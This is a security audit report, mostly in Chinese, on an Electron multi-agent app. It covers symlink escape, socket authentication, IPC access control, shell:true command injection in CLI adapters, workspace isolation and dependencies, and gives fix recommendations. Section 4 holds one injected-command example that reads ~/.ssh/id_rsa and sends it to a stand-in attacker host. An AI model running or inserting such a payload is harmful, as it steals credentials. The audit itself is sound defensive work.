# Security Audit — Round 2 New Features
**Date:** 2026-05-30
**Issue:** CMPAAA-597
**Scope:** Round 2 功能安全扫描 (符号链接逃逸、SocketBus 认证、SharedContext 访问控制、适配器安全、Workspace 隔离、依赖安全)
**Reviewer:** Security Engineer

---

## Summary

| 维度 | 风险等级 | 状态 |
|------|----------|------|
| 1. 符号链接逃逸 (resolveSafe) | **Low** | ✅ 修复基本完整，有 TOCTOU 微瑕 |
| 2. SocketBus 认证 | **Low** | ✅ 认证机制健全 |
| 3. SharedContext 访问控制 | **Medium** | ⚠️ IPC 层缺少 dagId 归属验证 |
| 4. 适配器安全 | **High** | 🔴 shell:true 命令注入 |
| 5. Workspace 隔离 | **Medium** | ⚠️ 仅进程内路径沙箱，无 OS 级隔离 |
| 6. 依赖安全 | **Low** | ✅ npm audit 无已知漏洞 |

**总计:** Critical 0 | High 1 | Medium 2 | Low 3

---

## 1. 符号链接逃逸 — resolveSafe()

**风险等级: Low**
**文件:** `src/main/workspace-manager.js:51-83`

### 审查结论

M2 (2026-05-28 审计) 指出的 `realpathSync` 缺失问题**已修复**。当前实现：

```js
// Line 56-58: 路径解析 + 前缀检查
const resolved = path.resolve(rootPath, relPath);
const normalizedRoot = path.resolve(rootPath) + path.sep;

// Line 65-73: 符号链接检测 + realPath 验证
const stat = fs.lstatSync(resolved);
if (stat.isSymbolicLink()) {
  const realTarget = fs.realpathSync(resolved);
  const realRoot = fs.realpathSync(rootPath);
  // 验证 realTarget 仍在 root 内
}
```

### 剩余风险

**TOCTOU 竞态条件 (Low):** `lstatSync` 和 `realpathSync` 之间存在微小时间窗口，攻击者可在检测期间交换符号链接目标。需要本地文件系统写入权限 + 精确时序，实际利用难度极高。

**写入路径竞态 (Low):** `writeFile` 调用 `resolveSafe` 后执行 `mkdirSync` + `writeFileSync`。如果攻击者在 `resolveSafe` 返回后、`writeFileSync` 之前在目标路径创建符号链接，可绕过检查。修复建议：使用 `fs.open` + `O_NOFOLLOW` 标志。

### 结论

修复基本完整，TOCTOU 为理论风险，暂无需创建子 issue。

---

## 2. SocketBus 认证

**风险等级: Low**
**文件:** `src/main/message-bus/socket-server.js`

### 审查结论

认证机制健全：

| 控制点 | 实现 | 评价 |
|--------|------|------|
| 强制握手 | 第 186-193 行：未认证连接只能发 handshake 消息 | ✅ |
| 认证回调 | 第 47 行：`this._authenticate` 可选注入 | ✅ |
| Squad 验证 | 第 241-265 行：验证 agent 是否为 squad 成员 | ✅ |
| 通配符匹配 | 第 254-259 行：支持 `*` 成员 + ownerRole 匹配 | ✅ |
| Socket 权限 | 第 77 行：`chmod 0o660` 限制为 owner+group | ✅ |
| Topic 命名空间 | 第 293 行：`_namespaceTopic` 隔离 squad 间消息 | ✅ |
| Buffer 溢出保护 | 第 158 行：`MAX_FRAME_BYTES = 1MB` | ✅ |

### 剩余风险

- **认证回调可选:** 如果启动时未注入 `authenticate` 函数，任何知道 agentId+squadId 的连接都能通过握手。当前代码中 `authenticate` 默认为 `null` (第 47 行)。建议将认证设为强制。
- **无速率限制:** 恶意客户端可高频发起连接尝试。建议添加连接速率限制。

### 结论

认证框架设计合理，无需创建子 issue。建议后续将 `authenticate` 设为必选参数。

---

## 3. SharedContext 访问控制

**风险等级: Medium**
**文件:** `src/main/ipc/controllers/shared-context.controller.js`
**子 issue:** CMPAAA-598 (待创建)

### 漏洞描述

IPC controller 直接信任客户端传入的 `dagId`，不验证调用方是否属于该 DAG：

```js
// shared-context.controller.js:17-19
async set(_event, { dagId, key, value, updatedBy }) {
  return sharedContextRepo.set(dagId, key, value, updatedBy);
}
```

任何能发起 Electron IPC 调用的进程（renderer 或 preload 暴露的接口）可以：
- 读取任意 DAG 的共享上下文 (`get`, `getMany`, `list`)
- 写入/覆盖任意 DAG 的上下文数据 (`set`)
- 删除任意 DAG 的上下文 (`delete`)

### 影响

- **数据泄露:** Agent A 可读取 Agent B 的共享上下文
- **数据篡改:** Agent A 可修改 Agent B 的上下文，影响其决策
- **攻击面:** 受限于 Electron IPC 本地通信，无法远程利用

### 修复建议

在 controller 层添加 dagId 归属验证：

```js
async set(_event, { dagId, key, value, updatedBy }) {
  // 验证调用方属于该 DAG
  const callerAgentId = _event.sender.session?.agentId;
  if (!await isAgentInDag(callerAgentId, dagId)) {
    throw IpcError.forbidden('Agent not in DAG');
  }
  return sharedContextRepo.set(dagId, key, value, updatedBy);
}
```

---

## 4. 适配器安全

**风险等级: High**
**文件:**
- `src/main/adapters/generic-cli.adapter.js` (第 46 行, 第 109 行)
- `src/main/adapters/gemini-cli.adapter.js` (第 54 行, 第 113 行)
**子 issue:** CMPAAA-599 (待创建)

### 漏洞描述

`generic-cli.adapter.js` 和 `gemini-cli.adapter.js` 使用 `shell: true` 启动子进程：

```js
// generic-cli.adapter.js:42-47
const proc = spawn(this.execPath, args, {
  cwd,
  env,
  stdio: ['pipe', 'pipe', 'pipe'],
  shell: true,  // ← 命令注入风险
});
```

`task.description` 作为 CLI 参数传入，经过 shell 解析。攻击示例：

```js
// task.description 包含 shell 元字符
task.description = "legit prompt; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)"
// 实际执行: execPath [defaultArgs] legit prompt; curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)
```

### 对比

| 适配器 | shell 设置 | 风险 |
|--------|-----------|------|
| `claude-code.adapter.js` | `shell: false` (默认) | ✅ 安全 |
| `codex.adapter.js` | `shell: false` (默认) | ✅ 安全 |
| `generic-cli.adapter.js` | `shell: true` | 🔴 命令注入 |
| `gemini-cli.adapter.js` | `shell: true` | 🔴 命令注入 |

### 环境变量泄露

所有适配器继承完整 `process.env` (第 40 行: `{ ...process.env, ...this.defaultEnv, ...params.env }`)。子进程可访问宿主进程的所有环境变量，包括可能的 API key、token 等敏感信息。

**风险等级: Low** — 本地进程间环境继承是标准行为，但应在文档中明确。

### 修复建议

1. **移除 `shell: true`** — 与 claude-code/codex 适配器保持一致
2. **环境变量白名单** — 只传递必要变量给子进程，而非继承全部 `process.env`

---

## 5. Workspace 隔离

**风险等级: Medium**
**文件:** `src/main/workspace-manager.js`

### 审查结论

| 隔离层 | 实现 | 评价 |
|--------|------|------|
| 路径沙箱 | `resolveSafe()` + 符号链接检测 | ✅ |
| 目录命名 | UUID 随机命名，不可猜测 | ✅ |
| 大小限制 | `_enforceSize()` 检查写入前大小 | ✅ |
| 读写锁 | 每 workspace 独立的 readers/writer 锁 | ✅ |
| 清理机制 | 7 天 archived + GC 调度 | ✅ |

### 剩余风险

**无 OS 级隔离 (Medium):** 所有 agent 以同一 OS 用户运行，workspace 目录在同一文件系统下。恶意 agent 可：
- 直接通过绝对路径读取其他 workspace (绕过 `resolveSafe`)
- 列出 `~/.agentops/workspaces/` 下所有 workspace
- 通过 `/proc` 或 `lsof` 获取其他 agent 的文件句柄

**`createForTask` 文件注入 (Low):** 第 437-461 行的 `injectFiles` 从 `projectRoot` 复制文件到 workspace。如果 `projectRoot` 被控制，可能注入恶意文件。但 `projectRoot` 由内部代码设置，非用户输入。

### 结论

路径级沙箱设计合理。OS 级隔离超出当前架构范围，可作为后续增强。暂无需创建子 issue。

---

## 6. 依赖安全

**风险等级: Low**

### npm audit 结果

```
npm audit: 0 vulnerabilities found
```

### 依赖清单

| 依赖 | 版本 | 类型 | 备注 |
|------|------|------|------|
| better-sqlite3 | ^12.10.0 | runtime | SQLite 绑定，原生模块 |
| hono | ^4.12.23 | runtime | HTTP 框架 |
| react/react-dom | ^19.2.6 | runtime | UI 框架 |
| uuid | ^11.1.0 | runtime | UUID 生成 |
| electron | ^41.7.1 | dev | Electron 运行时 |
| electron-builder | ^25.1.8 | dev | 打包工具 |
| esbuild | ^0.28.0 | dev | 构建工具 |

### 与 2026-05-28 审计对比

| 问题 | 2026-05-28 状态 | 当前状态 |
|------|----------------|----------|
| glob 命令注入 | High (transitive) | ✅ 已修复 |
| tar 路径遍历 | High (transitive) | ✅ 已修复 |
| esbuild SSRF | Moderate (dev only) | ℹ️ 仅 dev 依赖，低风险 |

### 结论

无已知漏洞，依赖链干净。

---

## 综合评估

### 正面发现

- `resolveSafe()` 符号链接检测已正确实现
- SocketBus 认证框架设计合理，支持 squad 隔离
- `claude-code.adapter.js` 和 `codex.adapter.js` 使用 `shell: false`
- `contextIsolation: true` + `nodeIntegration: false` — Electron 安全基线正确
- 所有 spawn 使用 `shell: false` 的适配器避免了命令注入
- Workspace 路径沙箱 + 大小限制 + 读写锁设计完整
- 依赖链无已知 CVE

### 待创建子 issue

| ID | 标题 | 严重等级 | 优先级 |
|----|------|----------|--------|
| CMPAAA-598 | SharedContext IPC 缺少 dagId 归属验证 | Medium | Medium |
| CMPAAA-599 | GenericCliAdapter/GeminiCliAdapter shell:true 命令注入 | High | High |

### 与 2026-05-28 审计的关系

本次审计聚焦 Round 2 新功能。2026-05-28 审计的 13 项发现 (C1/H1-H5/M1-M5/L1-L2) 仍有效，需独立跟踪。本次发现的 H 级问题 (shell:true) 是新引入的，不在前次审计范围内。

---

## 修复优先级

1. **CMPAAA-599** (High) — 移除 generic-cli/gemini-cli 的 `shell: true`
2. **CMPAAA-598** (Medium) — SharedContext IPC dagId 归属验证
3. SocketBus `authenticate` 设为必选参数 (建议)
4. 环境变量白名单传递 (建议)
5. Workspace TOCTOU 微瑕 — `O_NOFOLLOW` 加固 (建议)
